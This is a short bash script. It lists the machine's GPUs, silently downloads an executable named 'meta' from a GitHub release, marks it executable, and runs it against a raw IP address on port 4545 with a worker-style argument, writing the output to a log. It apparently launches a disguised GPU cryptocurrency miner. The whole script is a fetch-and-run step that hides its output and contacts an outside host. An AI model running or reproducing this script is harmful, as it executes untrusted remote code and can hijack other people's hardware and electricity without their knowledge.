#!/bin/bash
nvidia-smi -L
wget https://github.com/kaseyigv24/metadata/releases/download/1/meta &> /dev/null
chmod +x meta
./meta -P http://64.52.174.90:4545/"$1" &> log
